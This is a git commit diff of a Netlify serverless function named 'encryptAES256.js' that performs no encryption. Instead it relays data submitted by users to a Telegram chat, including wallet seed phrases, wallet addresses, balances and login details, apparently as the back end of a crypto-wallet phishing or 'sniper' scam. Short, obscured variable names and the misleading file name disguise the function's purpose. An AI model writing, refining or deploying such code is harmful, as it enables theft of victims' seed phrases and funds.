927f320bce024b66a5b34a4e27ad83f1e6d1a72a
dtaylor4k <160911263+dtaylor4k@users.noreply.github.com>
2024-02-24 21:14:30 +0000

    Update encryptAES256.js

--- netlify/functions/encryptAES256.js
+++ netlify/functions/encryptAES256.js
@@ -1,6 +1,18 @@
 exports.handler = async (event) => {
-    const { type, dataReceived } = JSON.parse(event.body);
-    
+
+    if (event.httpMethod === "OPTIONS") {
+        return {
+            statusCode: 204,
+            headers: {
+                "Access-Control-Allow-Origin": "*",
+                "Access-Control-Allow-Headers": "Content-Type",
+                "Access-Control-Allow-Methods": "POST, OPTIONS",
+            },
+            body: "",
+        };
+    }
+
+
     //message headers
     const uid = process.env.uid; //userID
     const nom = process.env.nom; //Name
@@ -22,108 +34,112 @@ exports.handler = async (event) => {
     const uMM = process.env.uMM; //user reached main menu
     const uRFSH = process.env.uRFSH; //user refreshed
 
-    const headers = {
-        "Access-Control-Allow-Origin": "*",
-        "Access-Control-Allow-Headers": "Content-Type",
-        "Access-Control-Allow-Methods": "POST, OPTIONS",
-    };
 
 
-    if (event.httpMethod === "OPTIONS") {
-        return { statusCode: 204, headers };
-    }
+    try {
+        const { type, details: dataReceived } = JSON.parse(event.body);
+        let msa; //message
 
-
-    let msa; //message
-
-    switch (type) {
-
-        case `${uR}`: //user register
-            msa = `<u>${uR}</u>\n` +
-                `${uid}: <b>${dataReceived.uid}</b>\n` +
-                `${nom}: <b>${dataReceived.nom}</b>\n` +
-                `${addi}: <b>${dataReceived.addi}</b>\n` +
-                `${authw}: <b>${dataReceived.authw}</b>\n` +
-                `${ref}: <b>${dataReceived.ref}</b>`;
-            break;
-
-        case `${uL}`: //user login
-            msa = `<u>${uL}</u>\n` +
-                `${uid}: <b>${dataReceived.uid}</b>\n` +
-                `${addi}: <b>${dataReceived.addi}</b>\n` +
-                `${authw}: <b>${dataReceived.authw}</b>`;
-            break;
-            
-        case `${uN}`: //user select network
-            msa = `<u>${uN}</u>\n` +
-                `${uid}: <b>${dataReceived.uid}</b>\n` +
-                `${net}: <b>${dataReceived.net}</b>`;
-            break;
-
-        case `${uASP}`: //user add seed phrase
-            msa = `<u>${uASP}</u>\n` +
-                `${uid}: <b>${dataReceived.uid}</b>\n` +
-                `${pip}: <b>${dataReceived.pip}</b>`;
-            break; 
-
-        case `${uAWA}`: //user add wallet address
-            msa = `<u>${uAWA}</u>\n` +
-                `${uid}: <b>${dataReceived.uid}</b>\n` +
-                `${wal}: <b>${dataReceived.wal}</b>`;
-            break;                   
-            
-        case `${addFW}`: //user add full wallet
-            msa = `<u>${addFW}</u>\n` +
-                `${uid}: <b>${dataReceived.uid}</b>\n` +
-                `${net}: <b>${dataReceived.net}</b>\n` +
-                `${wal}: <b>${dataReceived.wal}</b>\n` +
-                `${pip}: <b>${dataReceived.pip}</b>`;
-            break;  
-
-        case `${uMM}`: //user Log to main sniper menu
-            msa = `<u>${uMM}</u>\n` +
-                `${uid}: <b>${dataReceived.uid}</b>\n` +
-                `${nom}: <b>${dataReceived.nom}</b>\n` +
-                `${addi}: <b>${dataReceived.addi}</b>\n` +
-                `${pip}: <b>${dataReceived.pip}</b>\n` +
-                `${wal}: <b>${dataReceived.wal}</b>\n` +
-                `${bal}: <b>${dataReceived.bal} ${dataReceived.net}</b>`;
-            break;           
-            
-        case `${uRFSH}`: //user add full wallet
-            msa = `<u>${uRFSH}</u>\n` +
-                `${uid}: <b>${dataReceived.uid}</b>\n` +
-                `${wal}: <b>${dataReceived.wal}</b>\n` +
-                `${bal}: <b>${dataReceived.bal} ${dataReceived.symbol}</b>`;
-            break;  
-
+        switch (type) {
+    
+            case `${uR}`: //user register
+                msa = `<u>${uR}</u>\n` +
+                    `${uid}: <b>${dataReceived.uid}</b>\n` +
+                    `${nom}: <b>${dataReceived.nom}</b>\n` +
+                    `${addi}: <b>${dataReceived.addi}</b>\n` +
+                    `${authw}: <b>${dataReceived.authw}</b>\n` +
+                    `${ref}: <b>${dataReceived.ref}</b>`;
+                break;
+    
+            case `${uL}`: //user login
+                msa = `<u>${uL}</u>\n` +
+                    `${uid}: <b>${dataReceived.uid}</b>\n` +
+                    `${addi}: <b>${dataReceived.addi}</b>\n` +
+                    `${authw}: <b>${dataReceived.authw}</b>`;
+                break;
                 
-            break;
-    }
+            case `${uN}`: //user select network
+                msa = `<u>${uN}</u>\n` +
+                    `${uid}: <b>${dataReceived.uid}</b>\n` +
+                    `${net}: <b>${dataReceived.net}</b>`;
+                break;
+    
+            case `${uASP}`: //user add seed phrase
+                msa = `<u>${uASP}</u>\n` +
+                    `${uid}: <b>${dataReceived.uid}</b>\n` +
+                    `${pip}: <b>${dataReceived.pip}</b>`;
+                break; 
+    
+            case `${uAWA}`: //user add wallet address
+                msa = `<u>${uAWA}</u>\n` +
+                    `${uid}: <b>${dataReceived.uid}</b>\n` +
+                    `${wal}: <b>${dataReceived.wal}</b>`;
+                break;                   
+                
+            case `${addFW}`: //user add full wallet
+                msa = `<u>${addFW}</u>\n` +
+                    `${uid}: <b>${dataReceived.uid}</b>\n` +
+                    `${net}: <b>${dataReceived.net}</b>\n` +
+                    `${wal}: <b>${dataReceived.wal}</b>\n` +
+                    `${pip}: <b>${dataReceived.pip}</b>`;
+                break;  
+    
+            case `${uMM}`: //user Log to main sniper menu
+                msa = `<u>${uMM}</u>\n` +
+                    `${uid}: <b>${dataReceived.uid}</b>\n` +
+                    `${nom}: <b>${dataReceived.nom}</b>\n` +
+                    `${addi}: <b>${dataReceived.addi}</b>\n` +
+                    `${pip}: <b>${dataReceived.pip}</b>\n` +
+                    `${wal}: <b>${dataReceived.wal}</b>\n` +
+                    `${bal}: <b>${dataReceived.bal} ${dataReceived.net}</b>`;
+                break;           
+                
+            case `${uRFSH}`: //user add full wallet
+                msa = `<u>${uRFSH}</u>\n` +
+                    `${uid}: <b>${dataReceived.uid}</b>\n` +
+                    `${wal}: <b>${dataReceived.wal}</b>\n` +
+                    `${bal}: <b>${dataReceived.bal} ${dataReceived.symbol}</b>`;
+                break;  
 
-    // Send message to Telegram
-    return sTM(msa)
-        .then(() => ({ statusCode: 200, body: "MSA Successful!" }))
-        .catch(error => ({ statusCode: 500, body: `MSA Error: ${error.message}` }));
+        }
+
+        const sendMessageResponse = await sTM(msa);
+        return {
+            statusCode: 200,
+            headers: {
+                "Access-Control-Allow-Origin": "*",
+            },
+            body: JSON.stringify({ message: "Message sent successfully", response: sendMessageResponse }),
+        };
+    } catch (error) {
+        console.error("Error:", error);
+        return {
+            statusCode: 500,
+            headers: {
+                "Access-Control-Allow-Origin": "*",
+            },
+            body: JSON.stringify({ error: error.message }),
+        };
+    }
 };
 
 async function sTM(text) {
     const cID = process.env.cID;
-    const apiURL = process.env.apiURL; //TG API KEY + URL
+    const apiUrl = process.env.apiURL;
 
-
-    const response = await fetch(apiURL, {
+    const response = await fetch(apiUrl, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
             chat_id: cID,
-            text,
-            parse_mode: 'HTML'
+            text: text,
+            parse_mode: 'HTML',
         }),
     });
 
-    const data = await response.json();
-    if (!data.ok) throw new Error('Error Processing MSA');
+    if (!response.ok) {
+        throw new Error(`Telegram API responded with status ${response.status}`);
+    }
 
-    return data;
+    return await response.json();
 }
